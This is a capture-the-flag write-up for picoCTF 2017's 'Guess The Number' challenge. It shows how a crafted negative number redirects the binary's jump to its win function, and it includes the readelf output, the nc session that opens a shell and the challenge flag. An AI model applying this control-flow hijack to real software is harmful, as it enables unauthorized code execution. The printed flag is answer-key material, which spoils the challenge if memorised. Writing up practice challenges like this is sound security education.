# Guess The Number

> Just a simple number-guessing game. How hard could it be? Binary Source. Connect on shell2017.picoctf.com:20545.

Hints:

> What is the program doing with your input number?

> strtol checks for overflow, but it does allow negative numbers...

We can notice that the program jumps to the address we will give it. However it shifts right our number by 4 bits first.

Using `readelf` we can find address of the win function.
```
$ readelf guess_num -s
...(a lot of data)
    59: 00000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@@GLIBC_
    60: 08048630    97 FUNC    GLOBAL DEFAULT   13 __libc_csu_init
    61: 0804852b    40 FUNC    GLOBAL DEFAULT   13 win
    62: 08049a08     0 NOTYPE  GLOBAL DEFAULT   25 _end
    63: 08048430     0 FUNC    GLOBAL DEFAULT   13 _start
...(a lot of data)
```
We can easily calculate the number we need `0x0804852b <<4 = -2142743888`. (`<<` stands for shitf left)
Now we can connect to the server.

```
$ nc shell2017.picoctf.com 20545
Welcome to the number guessing game!
I'm thinking of a number. Can you guess it?
Guess right and you get a shell!
Enter your number: -2142743888
You entered -2142743888. Let's see if it was right...
Congratulations! Have a shell:
/bin/sh: 0: can't access tty; job control turned off
$ ls
flag.txt
guess_num
xinetd_wrapper.sh
$ cat flag.txt
181db5615729e295ea7a5d5773c3829b
```

The flag is `181db5615729e295ea7a5d5773c3829b`.